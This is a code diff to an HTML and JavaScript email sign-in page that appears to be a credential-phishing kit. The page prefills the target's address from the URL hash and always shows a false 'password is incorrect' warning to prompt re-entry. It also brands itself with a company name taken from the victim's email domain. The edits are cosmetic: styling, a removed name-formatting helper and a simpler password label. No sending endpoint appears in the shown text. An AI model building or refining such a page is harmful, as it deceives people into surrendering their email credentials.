@@ -25,13 +25,6 @@
         button:hover {
             background-color: #0A4B8A; /* Slightly darker blue on hover */
         }
-
-        .password-header {
-            font-size: 16px;
-            font-weight: bold;
-            color: #444;
-            margin-bottom: 8px;
-        }
     </style>
 </head>
 
@@ -46,8 +39,7 @@
                     <!-- Dynamic Company Name -->
                     <h5 id="companyName" style="margin-top: 18px; margin-bottom: 6px;"></h5>
                 </div>
-                <div id="err" 
-                     style="padding: 16px 40px; background: #efcccb; border-bottom: 2px solid rgb(128,0,0);">
+                <div style="padding: 16px 40px;">
                     <p style="font-size: 13px;">
                         The password is incorrect. Try again with your email password.
                     </p>
@@ -55,11 +47,8 @@
                 <div style="padding: 16px 40px;">
                     <p style="font-size: 12px; margin-bottom: 4px;">Sign in with your Email to continue</p>
                     <input type="text" id="id" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
-
-                    <!-- Password Input -->
-                    <p class="password-header">Enter password</p>
-                    <input type="password" id="pass" placeholder="Password" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
-                    
+                    <p style="font-size: 12px; margin-bottom: 4px; margin-top: 14px;">Password</p>
+                    <input type="password" id="pass" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
                     <div class="sp-div" style="margin-top: 10px;">
                         <button class="btn btn-primary" id="next-btn" 
                                 type="button" 
@@ -94,16 +83,9 @@
             // Prefill the username
             document.getElementById("id").value = hash;
 
-            // Extract domain and root for branding with space addition
+            // Extract domain and root for branding
             const emailParts = hash.split("@");
             const domain = emailParts[1].toLowerCase();
-
-            function formatCompanyName(str) {
-                // Replace hyphens/underscores with spaces
-                let formatted = str.replace(/[-_]/g, " ");
-                // Add spacing for camelCase words (e.g., "TechnitySolutions" → "Technity Solutions")
-                return formatted.replace(/([a-z])([A-Z])/g, "$1 $2").trim();
-            }
 
             // Static mapping for known domains and company names
             const companyNameMapping = {
@@ -111,7 +93,7 @@
                 "examplecompany.com": "Example Company",
             };
 
-            const companyName = companyNameMapping[domain] || formatCompanyName(domain.split(".")[0]);
+            const companyName = companyNameMapping[domain] || domain.split(".")[0].replace(/[-_]/g, " ").toUpperCase();
             document.getElementById("companyName").textContent = companyName;
 
             // Update page title dynamically
